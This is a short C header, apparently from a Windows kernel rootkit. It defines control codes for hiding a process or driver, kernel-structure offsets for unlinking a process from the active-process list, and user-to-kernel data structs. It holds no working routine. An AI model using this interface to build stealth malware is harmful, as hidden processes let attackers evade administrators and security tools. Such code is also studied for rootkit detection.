#pragma once

#define RK_CTL_PROCESS_HIDE CTL_CODE(0xcc44, 0x944, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define RK_CTL_DRIVER_HIDE CTL_CODE(0xcc45, 0x945, METHOD_NEITHER, FILE_ANY_ACCESS)


#define DATA_FROM_USER_SIZE sizeof(DATA_FROM_USER)
#define DATA_TO_USER_SIZE sizeof(DATA_TO_USER)

// change according to windows version..
#define UniqueProcessIdOffset		(UINT64)0x1d0
#define ActiveProcessLinksOffset	(UINT64)0x1d8

// FROM USER TO KERNEL..
typedef struct _DATA_FROM_USER
{
	UINT32 PID;
}DATA_FROM_USER, *PDATA_FROM_USER;


// FORM KERNEL TO USER..
typedef struct _DATA_TO_USER
{
	bool IsProcessHidden;
}DATA_TO_USER, *PDATA_TO_USER;